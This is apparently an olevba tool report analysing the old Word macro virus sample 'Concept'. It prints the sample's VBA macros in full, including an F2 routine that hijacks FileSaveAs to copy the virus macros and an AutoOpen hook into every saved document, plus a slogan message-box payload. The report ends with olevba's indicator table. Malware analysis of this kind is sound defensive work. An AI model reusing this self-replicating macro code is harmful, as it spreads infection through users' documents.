olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Concept-d6e7702f1954fa49ec40fd3ffff86cca38bcbb74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Concept-d6e7702f1954fa49ec40fd3ffff86cca38bcbb74 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Boom.bas 
in file: Virus.MSWord.Concept-d6e7702f1954fa49ec40fd3ffff86cca38bcbb74 - OLE stream: 'Macros/VBA/Boom'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    WordBasic.MsgBox "Fight Racism; Smash Fascism", "AFA", 16
End Sub
-------------------------------------------------------------------------------
VBA MACRO F2.bas 
in file: Virus.MSWord.Concept-d6e7702f1954fa49ec40fd3ffff86cca38bcbb74 - OLE stream: 'Macros/VBA/F2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
'this becomes the FileSaveAs for the global template
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
On Error GoTo -1: On Error GoTo Bail
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:F1", sTMacro$
sTMacro$ = sMe$ + ":F1"
WordBasic.MacroCopy "Global:F1", sTMacro$
sTMacro$ = sMe$ + ":F2"
WordBasic.MacroCopy "Global:F2", sTMacro$
sTMacro$ = sMe$ + ":Boom"
WordBasic.MacroCopy "Global:Boom", sTMacro$
WordBasic.FileSaveAs dlg
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

